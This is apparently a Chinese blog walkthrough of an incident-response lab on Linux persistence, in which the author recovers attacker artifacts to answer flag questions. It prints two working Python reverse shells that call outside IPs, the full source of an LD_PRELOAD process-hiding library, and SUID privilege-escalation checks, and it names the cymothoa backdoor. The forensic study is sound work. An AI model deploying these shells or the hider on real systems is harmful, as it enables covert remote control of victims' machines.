+++
title = "玄机第三章"
slug = "xuanji-chapter-3"
description = "刷"
date = "2025-03-14T14:56:32"
lastmod = "2025-03-14T14:56:32"
image = ""
license = ""
categories = [""]
tags = ["应急响应"]
+++

## 第三章 权限维持-linux权限维持-隐藏

### f1&&f2

`libprocesshider`是用于隐藏文件的项目，一般权限维持都是在`/tmp`，包括我打CTF也是这么做的，进入之后依次递进到了`/tmp/.temp/libprocesshider`，看到了`1.py`

```python
#!/usr/bin/python3

import socket,subprocess,os,sys, time

pidrg = os.fork()
if pidrg > 0:
        sys.exit(0)

os.chdir("/")
os.setsid()
os.umask(0)
drgpid = os.fork()
if drgpid > 0:
        sys.exit(0)

while 1:
        try:
                sys.stdout.flush()
                sys.stderr.flush()
                fdreg = open("/dev/null", "w")
                sys.stdout = fdreg
                sys.stderr = fdreg
                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sdregs.connect(("114.114.114.121",9999))
                os.dup2(sdregs.fileno(),0)
                os.dup2(sdregs.fileno(),1)
                os.dup2(sdregs.fileno(),2)
                p=subprocess.call(["/bin/bash","-i"])
                sdregs.close()
        except Exception:
                pass
        time.sleep(2)
```

是一个进行提权的脚本，里面有个`processhider.c`

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "1.py";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                strcmp(process_name, process_to_filter) == 0) {         \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
```

`shell.py`也是反弹shell的，

```python
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.16.10.7",2220))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
run(["/bin/bash","-i"])
```

```
flag{109ccb5768c70638e24fb46ee7957e37}
flag{114.114.114.121:9999}
```

### f3

黑客提权其实和我们是一样的，我们先找找常见的

```
sudo -l 

find / -perm -u=s -type f 2>/dev/null
```

发现`find`

```
flag{7fd5884f493f4aaf96abee286ee04120}
```

### f4

去`/opt`发现了有东西，一直递进

```shell
root@xuanji:/opt/.cymothoa-1-beta# ls
Makefile  core        cymothoa.h             payloads.h         syscalls.txt
bgrep     cymothoa    hexdump_to_cstring.pl  personalization.h  udp_server
bgrep.c   cymothoa.c  payloads               syscall_code.pl    udp_server.c
```

`cymothoa`是后门工具

```
flag{087c267368ece4fcf422ff733b51aed9}
```

### f5

这个题我都没看懂在讲什么东西，后面发现原来是`1.py`，所以我们找python在哪里就好了

```
python3 /tmp/.temp/libprocesshider/1.py
ls -l /usr/bin/python3
which python3.4
```

```
flag{/usr/bin/python3.4}
```

